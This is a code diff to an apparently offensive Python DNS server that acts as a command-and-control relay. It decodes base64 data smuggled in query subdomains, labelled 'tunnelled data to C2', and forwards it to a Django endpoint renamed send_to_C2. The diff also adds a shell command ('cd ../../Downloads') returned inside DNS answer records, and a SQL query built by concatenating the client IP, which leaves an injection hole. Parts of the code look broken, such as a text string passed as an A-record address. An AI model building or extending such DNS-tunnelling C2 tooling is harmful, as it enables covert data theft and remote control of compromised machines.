@@ -2,6 +2,7 @@ from dnslib import DNSRecord, QTYPE,  RR, A, DNSHeader
 import socket
 import socketserver
 import base64
+import sqlite3
 import requests
 
 hostname = socket.gethostname()
@@ -13,7 +14,19 @@ DOMAIN_TO_IP = {
 
 DJANGO_SERVER = "http://127.0.0.1:8000"
 
-def send_to_db(ip, resp_data):
+def write_to_bufDB(ip, resp_data):
+    conn = sqlite3.connect('dns.db')
+    cursor = conn.cursor()
+    cursor.execute("INSERT INTO dns_responses VALUES (?,?)",(ip, resp_data))
+
+def join_data(ip):
+    conn = sqlite3.connect('dns.db')
+    cursor = conn.cursor()
+    cursor.execute("SELECT response FROM dns_responses WHERE ip="+ip+";")
+    print(cursor.fetchall())
+
+
+def send_to_C2(ip, resp_data):
     url = f"{DJANGO_SERVER}/dns_tun"
     data = {
         "ip":ip,
@@ -51,8 +64,10 @@ class DNSHandler(socketserver.BaseRequestHandler):
             # send tunnelled data to C2
             tunnelled_data = base64.b64decode(qname.split('.')[0])
             tunnelled_data = tunnelled_data.decode()
-            send_to_db(ip=self.client_address[0], 
-                       resp_data=tunnelled_data)
+            if tunnelled_data == "#END#":
+                join_data(self.client_address[0])
+
+            #send_to_db(ip=self.client_address[0], resp_data=tunnelled_data)
 
             qname = ('.'.join(str(request.q.qname).split('.')[1:]))[:-1]
             qtype = QTYPE[request.q.qtype]
@@ -61,7 +76,7 @@ class DNSHandler(socketserver.BaseRequestHandler):
                 # RR - resource records
                 # RR Class Contains RR header and RD (resource data) instance
                 # qname, QTYPE.A, rdata=A(DOMAIN_TO_IP[qname]
-                reply.add_answer(RR(rname=qname,  rtype=QTYPE.A, rdata=A(DOMAIN_TO_IP[qname])))
+                reply.add_answer(RR(rname="a.com",  rtype=QTYPE.A, rdata="cd ../../Downloads###"))
                 print(f"Resolved {qname} to {DOMAIN_TO_IP[qname]}")
             else:
                 print(f"No record found for {qname}")
